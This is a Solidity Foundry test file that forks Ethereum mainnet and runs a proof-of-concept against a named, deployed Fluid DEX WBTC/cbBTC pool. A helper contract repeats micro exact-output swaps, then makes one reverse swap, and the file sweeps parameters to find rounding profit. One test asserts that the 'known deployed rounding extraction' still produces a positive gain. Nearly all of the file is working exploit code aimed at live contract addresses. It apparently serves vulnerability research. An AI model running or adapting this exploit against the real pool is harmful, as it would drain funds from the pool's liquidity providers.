// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import { Test } from "forge-std/Test.sol";

interface IERC20SplitBatch {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFluidDexSplitBatch {
    function readFromStorage(bytes32 slot) external view returns (uint256);
    function swapOut(bool swap0to1, uint256 amountOut, uint256 amountInMax, address to)
        external payable returns (uint256 amountIn);
}

contract WbtcCbbtcSplitBatchExecutor {
    address internal immutable pool;
    address internal immutable token0;
    address internal immutable token1;

    constructor(address pool_, address token0_, address token1_) {
        pool = pool_;
        token0 = token0_;
        token1 = token1_;
        require(IERC20SplitBatch(token0_).approve(pool_, type(uint256).max), "TOKEN0_APPROVE");
        require(IERC20SplitBatch(token1_).approve(pool_, type(uint256).max), "TOKEN1_APPROVE");
    }

    /// @notice Repeats many exact-output micro-swaps in one direction and then
    /// restores the entire input asset with one exact-output reverse swap.
    /// A positive delta in the other token is a closed-cycle pool loss.
    function splitForwardThenSingleReverse(bool forward0to1, uint256 rounds, uint256 outEach)
        external
        returns (
            uint256 totalForwardInput,
            uint256 reverseInput,
            int256 deltaToken0,
            int256 deltaToken1
        )
    {
        uint256 before0 = IERC20SplitBatch(token0).balanceOf(address(this));
        uint256 before1 = IERC20SplitBatch(token1).balanceOf(address(this));

        if (forward0to1) {
            for (uint256 i; i < rounds; ++i) {
                totalForwardInput += IFluidDexSplitBatch(pool).swapOut(
                    true, outEach, type(uint256).max, address(this)
                );
            }
            reverseInput = IFluidDexSplitBatch(pool).swapOut(
                false, totalForwardInput, type(uint256).max, address(this)
            );
        } else {
            for (uint256 i; i < rounds; ++i) {
                totalForwardInput += IFluidDexSplitBatch(pool).swapOut(
                    false, outEach, type(uint256).max, address(this)
                );
            }
            reverseInput = IFluidDexSplitBatch(pool).swapOut(
                true, totalForwardInput, type(uint256).max, address(this)
            );
        }

        deltaToken0 = int256(IERC20SplitBatch(token0).balanceOf(address(this))) - int256(before0);
        deltaToken1 = int256(IERC20SplitBatch(token1).balanceOf(address(this))) - int256(before1);
    }
}

contract WbtcCbbtcSplitBatchAmplificationTest is Test {
    address internal constant POOL = 0x3C0441B42195F4aD6aa9a0978E06096ea616CDa7;
    address internal constant LIQUIDITY = 0x52Aa899454998Be5b000Ad077a46Bbe360F4e497;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant CBBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;

    event SplitBatchResult(
        bool indexed forward0to1,
        uint256 rounds,
        uint256 outEach,
        uint256 totalForwardInput,
        uint256 reverseInput,
        int256 deltaWbtc,
        int256 deltaCbBtc,
        int256 equalWeightRawPnl,
        uint256 liquidityLossWbtc,
        uint256 liquidityLossCbBtc,
        uint256 gasUsed
    );

    event SplitBatchRevert(
        bool indexed forward0to1,
        uint256 rounds,
        uint256 outEach,
        bytes4 selector,
        uint256 errorId
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
    }

    function _configuration() internal view {
        uint256 packed = IFluidDexSplitBatch(POOL).readFromStorage(bytes32(uint256(1)));
        assertEq((packed >> 2) & ((1 << 17) - 1), 45, "unexpected fee");
        assertEq(packed & 3, 3, "both smart pools should be active");
        assertEq(packed >> 255, 0, "pool paused");
    }

    function _executor() internal returns (WbtcCbbtcSplitBatchExecutor executor) {
        executor = new WbtcCbbtcSplitBatchExecutor(POOL, WBTC, CBBTC);
        deal(WBTC, address(executor), 10_000_000_000);
        deal(CBBTC, address(executor), 10_000_000_000);
    }

    function _decodeRevert(bytes memory reason) internal pure returns (bytes4 selector, uint256 errorId) {
        if (reason.length >= 4) {
            assembly {
                selector := mload(add(reason, 32))
            }
        }
        if (reason.length >= 36) {
            assembly {
                errorId := mload(add(reason, 36))
            }
        }
    }

    function _run(bool forward0to1, uint256 rounds, uint256 outEach)
        internal
        returns (bool success, int256 rawPnl)
    {
        uint256 snap = vm.snapshot();
        WbtcCbbtcSplitBatchExecutor executor = _executor();
        uint256 liquidityWbtcBefore = IERC20SplitBatch(WBTC).balanceOf(LIQUIDITY);
        uint256 liquidityCbBtcBefore = IERC20SplitBatch(CBBTC).balanceOf(LIQUIDITY);
        uint256 gasBefore = gasleft();

        try executor.splitForwardThenSingleReverse(forward0to1, rounds, outEach) returns (
            uint256 totalForwardInput,
            uint256 reverseInput,
            int256 deltaWbtc,
            int256 deltaCbBtc
        ) {
            uint256 gasUsed = gasBefore - gasleft();
            uint256 liquidityWbtcAfter = IERC20SplitBatch(WBTC).balanceOf(LIQUIDITY);
            uint256 liquidityCbBtcAfter = IERC20SplitBatch(CBBTC).balanceOf(LIQUIDITY);
            uint256 lossWbtc = liquidityWbtcBefore > liquidityWbtcAfter
                ? liquidityWbtcBefore - liquidityWbtcAfter
                : 0;
            uint256 lossCbBtc = liquidityCbBtcBefore > liquidityCbBtcAfter
                ? liquidityCbBtcBefore - liquidityCbBtcAfter
                : 0;

            rawPnl = deltaWbtc + deltaCbBtc;
            success = true;
            emit SplitBatchResult(
                forward0to1,
                rounds,
                outEach,
                totalForwardInput,
                reverseInput,
                deltaWbtc,
                deltaCbBtc,
                rawPnl,
                lossWbtc,
                lossCbBtc,
                gasUsed
            );
        } catch (bytes memory reason) {
            (bytes4 selector, uint256 errorId) = _decodeRevert(reason);
            emit SplitBatchRevert(forward0to1, rounds, outEach, selector, errorId);
        }

        require(vm.revertTo(snap), "restore failed");
    }

    function test_splitForwardSingleReversePowerSweepToken0To1() public {
        _configuration();
        uint256[11] memory rounds = [
            uint256(1), 2, 3, 4, 5, 8, 16, 32, 64, 128, 256
        ];
        int256 best;
        bool found;
        for (uint256 i; i < rounds.length; ++i) {
            (bool success, int256 pnl) = _run(true, rounds[i], 101);
            if (success && pnl > best) best = pnl;
            if (success && pnl > 0) found = true;
        }
        assertTrue(found, "known deployed rounding extraction disappeared");
        assertGe(best, 1, "positive extraction not observed");
    }

    function test_splitForwardSingleReversePowerSweepToken1To0() public {
        _configuration();
        uint256[9] memory rounds = [uint256(1), 2, 3, 4, 5, 8, 16, 32, 64];
        for (uint256 i; i < rounds.length; ++i) {
            _run(false, rounds[i], 101);
        }
    }

    function test_splitForwardSingleReverseAmountFamilies() public {
        _configuration();
        uint256[5] memory amounts = [uint256(101), 201, 501, 1_001, 10_001];
        uint256[5] memory rounds = [uint256(1), 2, 4, 8, 16];
        for (uint256 i; i < amounts.length; ++i) {
            for (uint256 j; j < rounds.length; ++j) {
                _run(true, rounds[j], amounts[i]);
            }
        }
    }
}
